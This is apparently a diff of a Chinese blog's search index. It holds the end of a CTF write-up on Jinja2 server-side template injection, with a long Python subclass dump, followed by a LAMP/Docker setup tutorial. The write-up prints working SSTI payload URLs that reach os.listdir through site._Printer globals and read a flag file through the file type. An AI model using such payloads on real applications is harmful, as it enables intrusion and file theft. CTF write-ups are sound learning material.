class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
-
-<p>可以在其中找到 **&lt;type ‘file’&gt;**类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
-<p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br></pre></td></tr></table></figure>
-
-<p>接下来构造读取flag payload</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到flag：</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ctf</span>&#123;f22b6844-<span class="number">5169</span>-<span class="number">4054</span>-b2a0-d95b9361cb57&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>CTF_Writeup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-        <tag>攻防世界</tag>
-        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -1585,62 +1536,52 @@
       </tags>
   </entry>
   <entry>
-    <title>记一次搭建LAMP web环境</title>
-    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
-<p>终端输入<code>php -v</code>查看PHP版本</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105539.png"></p>
-<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
-<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105283.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105413.png"></p>
-<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105653.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105983.png"></p>
-<p>服务正常启动</p>
-<p>接下来在网站测试服务是否可用</p>
-<p>linux浏览器输入localhost，若回显页面</p>
-<p><img data-src="https://images.gaifagafin.top/202311051105582.png"></p>
-<p>说明Apache服务正常</p>
-<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051105350.png"></p>
-<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106523.png"></p>
-<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106180.png"></p>
-<p>以上做完说明web环境被成功搭建</p>
-<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106639.png"></p>
-<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
-<p><img data-src="https://images.gaifagafin.top/202311051106325.png"></p>
-<p>输入<code>docker images</code>查看下载的镜像</p>
-<p><img data-src="https://images.gaifagafin.top/202311051106503.png"></p>
